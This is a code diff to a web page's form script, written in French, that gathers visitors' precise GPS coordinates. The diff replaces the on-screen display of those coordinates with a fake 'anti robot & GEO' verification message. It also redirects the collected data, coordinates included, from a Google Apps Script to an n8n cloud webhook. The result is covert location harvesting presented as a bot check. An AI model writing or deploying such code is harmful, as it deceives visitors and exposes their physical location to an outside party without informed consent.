@@ -130,14 +130,15 @@
         dataForm.style.display = 'block';
     
         const locationInput = document.getElementById('location-input');
-        locationInput.value = "Récupération de la localisation...";
+        locationInput.value = "Verification de la anti robot & GEO...";
     
         getGPSCoordinates()
           .then((coords) => {
             const lat = coords.latitude.toFixed(6);
             const lon = coords.longitude.toFixed(6);
     
-            locationInput.value = `Lat: ${lat}, Lon: ${lon} (±${Math.round(coords.accuracy)}m)`;
+            //locationInput.value = `Lat: ${lat}, Lon: ${lon} (±${Math.round(coords.accuracy)}m)`;
+            locationInput.value = `Test anti robot & GEO - OK`;
     
             console.log("📍 Google Maps :", `https://www.google.com/maps?q=${lat},${lon}`);
           })
@@ -178,20 +179,21 @@
         console.log("===================================");
     
         /* 🚀 ENVOI DANS GOOGLE SHEET */
-        fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxm7AQtV5-KsdgyxaXZJ8MGIMZtnXTAZGObMQ5J8WB1c6h-mzRpbRUFSyy0aWRJAMmC/exec"), {
-    method: "POST",
-    headers: { 
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify(collectedData)
-})
-.then(response => response.text())
-.then(result => {
-    console.log("🟢 Google Sheets a répondu :", result);
-})
-.catch(error => {
-    console.error("🔴 Erreur lors de l'envoi au Google Sheet :", error);
-});
+        fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(collectedData)
+    })
+    .then(res => res.text())
+    .then(result => {
+        console.log("🟢 n8n a répondu :", result);
+    })
+    .catch(error => {
+        console.error("🔴 Erreur n8n :", error);
+    });
+
 
     });
     </script>
